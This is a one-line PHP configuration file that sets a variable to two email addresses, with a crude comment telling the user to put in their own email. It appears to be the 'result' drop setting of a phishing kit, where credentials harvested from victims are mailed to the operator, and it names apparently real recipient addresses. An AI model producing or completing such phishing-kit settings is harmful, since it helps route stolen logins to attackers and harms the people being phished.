<?php

$email = "stansoto528@gmail.com,re5ultpage@yandex.com"; // PUT UR FUCKING E-MAIL BRO

?>